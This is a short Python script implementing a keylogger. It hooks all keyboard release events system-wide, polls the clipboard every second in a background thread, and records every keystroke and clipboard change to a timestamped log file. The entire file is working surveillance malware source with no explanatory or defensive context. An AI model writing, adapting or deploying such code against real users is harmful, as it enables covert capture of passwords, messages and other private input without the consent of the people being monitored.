import keyboard
import logging
import pyperclip
import threading
import time
from datetime import datetime

class KeyLog:
    def __init__(self):
        self.log_file = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        logging.basicConfig(filename=self.log_file, level=logging.INFO, format="%(asctime)s - %(message)s")

    def monitor_clipboard(self):
        current_clipboard = pyperclip.paste()

        while True:
            time.sleep(1)
            new_clipboard = pyperclip.paste()

            if new_clipboard != current_clipboard:
                current_clipboard = new_clipboard
                clipboard_entry = f"\nClipboard: {new_clipboard}"
                logging.info(clipboard_entry)

    def key_callback(self, event):
        # Debugging: Print complete event object for each key event
        #print(event)

        # Handle key events based on scan codes or names
        name = event.name

        if len(name) > 1:
            if name == "space":
               name = " "
            elif name == "enter":
               name = "[ENTER]\n"
            elif name == "ctrl":
                name = "[CTRL]"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]\n"
        logging.info(name)

    def start_logging(self):
        clipboard_thread = threading.Thread(target=self.monitor_clipboard)
        clipboard_thread.daemon = True
        clipboard_thread.start()

        keyboard.on_release(callback=self.key_callback)  # Use keyboard hook for low-level event handling

        # Wait indefinitely for keyboard events
        keyboard.wait()
# Instantiate KeyLog class and start logging keyboard events
if __name__ == "__main__":
    KeyLogger = KeyLog()
    KeyLogger.start_logging()
